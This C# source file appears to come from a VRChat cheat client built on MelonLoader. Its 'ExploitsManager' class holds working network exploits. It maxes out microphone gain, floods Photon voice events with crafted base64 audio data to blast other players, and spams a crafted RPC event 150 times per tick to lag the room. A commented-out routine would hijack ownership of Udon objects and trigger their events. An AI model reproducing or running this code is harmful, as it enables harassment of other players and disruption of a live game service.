using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using UnityEngine;
using VRC;
using VRC.SDKBase;
using System.Collections;
using Moonlight_Client.PhotonSDK;
using Photon.Realtime;
using ExitGames.Client.Photon;
using MelonLoader;
using Moonlight_Client.SDK;

namespace Moonlight_Client.Functions
{
    internal class ExploitsManager
    {
        public static void LoudAssMic()
        {
            USpeaker.field_Internal_Static_Single_1 = float.MaxValue;
        }

        public static void NormalMic()
        {
            USpeaker.field_Internal_Static_Single_1 = 1;
        }

        public static void dn()
        {
            Process.Start("https://vine.fandom.com/wiki/Deez_Nuts");
            Process.Start("https://www.youtube.com/watch?v=zDCQsScA_JA&t=25s");
        }

        public static bool LoudAssEvent = false;
        public static bool E6brr = false;
        public static bool udonasstoggled = false;

        internal static bool earrapeExploitRunning;

        public static IEnumerator PerformE1()
        {
            while (LoudAssEvent == true)
            {
                byte[] VoiceData = Convert.FromBase64String(
                    "AAAAAAAAAAC7hjsA+H3owFygUv4w5B67lcSx14zff9FCPADiNbSwYWgE+O7Dhiy5tkRecs21ljjofvebe6xsYlA4cVmght0=");
                byte[] nulldata = new byte[4];
                byte[] ServerTime = BitConverter.GetBytes(Networking.GetServerTimeInMilliseconds());
                Buffer.BlockCopy(nulldata, 0, VoiceData, 0, 4);
                Buffer.BlockCopy(ServerTime, 0, VoiceData, 4, 4);
                int num;
                for (int i = 0; i < 80; i = num + 1)
                {
                    PhotonExtensions.OpRaiseEvent(1, VoiceData, new RaiseEventOptions
                    {
                        field_Public_ReceiverGroup_0 = 0,
                        field_Public_EventCaching_0 = 0
                    }, default(SendOptions));
                    num = i;
                }
                VoiceData = null;
                nulldata = null;
                ServerTime = null;
                yield return new WaitForSeconds(0.01f);
            }
        }

        public static void Event1start()
        {
            MelonCoroutines.Start(PerformE1());
            LoudAssEvent = true;
        }

        public static void Even1NoStart()
        {
            LoudAssEvent = false;
            //MelonCoroutines.Stop(PerformE1());
        }

        
        public static void SixLaggerOn()
        {
            MelonCoroutines.Start(StartE6());
            E6brr = true;
        }

        public static void SixLaggerOff()
        {
            E6brr = false;
            //MelonCoroutines.Stop(StartE6());
        }

        public static void UdonAssOn()
        {
            MelonCoroutines.Start(UdonKill());
            LoudAssEvent = true;
        }

        public static IEnumerator UdonKill()
        {
            /*while (udonasstoggled)
            {
                for (int i = 0; i < PlayerWrapper.GetAllPlayers().Length; i++)
                {
                    if (PlayerWrapper.GetAllPlayers()[i].GetAPIUser().id == PlayerWrapper.LocalPlayer().GetAPIUser().id)
                        continue;

                    for (int j = 0; j < WorldWrapper.udonBehaviours.Length; j++)
                    {
                        foreach (string name in WorldWrapper.udonBehaviours[j]._eventTable.Keys)
                        {
                            Networking.SetOwner(PlayerWrapper.GetAllPlayers()[i].GetVRCPlayerApi(), WorldWrapper.udonBehaviours[j].gameObject);
                            WorldWrapper.udonBehaviours[j].SendCustomNetworkEvent(VRC.Udon.Common.Interfaces.NetworkEventTarget.Owner, name);
                            yield return new WaitForSeconds(0.25f);
                        }
                        yield return new WaitForSeconds(0.25f);
                        if (!udonasstoggled)
                            break;
                    }
                    yield return new WaitForSeconds(0.25f);
                    if (!udonasstoggled)
                        break;
                }

                yield return new WaitForSeconds(0.25f);
            }*/
            yield break;
        }

        public static IEnumerator StartE6()
        {
            while(E6brr == true)
            {
                byte[] rpcData =
                {
                106, 191, 218, 132, 88, 12, 0, 0, 0, 7,
                0, 58, 118, 213, 255, 255, 50, 47, 14, 0,
                255, 0, 0, 0, 0, 9, 0, 0, 0, 13,
                0, 69, 110, 97, 98, 108, 101, 77, 101, 115,
                104, 82, 80, 67, 0, 0, 0, 0, 0, 0,
                0, 2
                };

                Buffer.BlockCopy(BitConverter.GetBytes(VRCPlayer.field_Internal_Static_VRCPlayer_0.prop_VRCPlayerApi_0.playerId), 0, rpcData, 5, 4);

                for (int i = 0; i < 150; i++)
                {
                    PhotonExtensions.OpRaiseEvent(6, rpcData, new RaiseEventOptions
                    {
                        field_Public_ReceiverGroup_0 = 0,
                        field_Public_EventCaching_0 = 0
                    }, default(SendOptions));
                }
                yield return new WaitForSecondsRealtime(0.1f);
            }
        }
    }
}
